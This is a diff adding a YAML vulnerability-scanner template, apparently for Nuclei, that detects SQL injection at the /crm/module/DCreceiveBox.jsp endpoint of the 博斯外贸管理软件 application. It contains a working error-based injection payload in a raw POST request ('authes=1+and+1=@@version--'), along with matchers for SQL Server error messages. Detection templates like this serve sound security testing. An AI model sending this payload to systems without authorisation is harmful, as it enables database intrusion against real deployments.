@@ -1,0 +1,30 @@
+id: poc-yaml-51boss-yjzy-sqli
+info:
+  name: \u535A\u65AF\u5916\u8D38\u7BA1\u7406\u8F6F\u4EF6 YJZY SQL\u6CE8\u5165\u6F0F\u6D1E
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+  description: |
+    This template identifies an SQL injection vulnerability in the 博斯外贸管理软件 application via the /crm/module/DCreceiveBox.jsp endpoint.
+http:
+  - raw:
+      - |
+        POST /crm/module/DCreceiveBox.jsp HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+
+        fxlx=1&setCustom=YJZY&authes=1+and+1=@@version--
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "java.sql.SQLException"
+          - "Microsoft SQL Server"
+      - type: dsl
+        dsl:
+          - contains(gbk_decode(body), "\u8F6C\u6362\u4E3A\u6570\u636E\u7C7B\u578B\u4E3A")
+          - contains(gbk_decode(body), "\u53D1\u751F\u8BED\u6CD5\u9519\u8BEF")
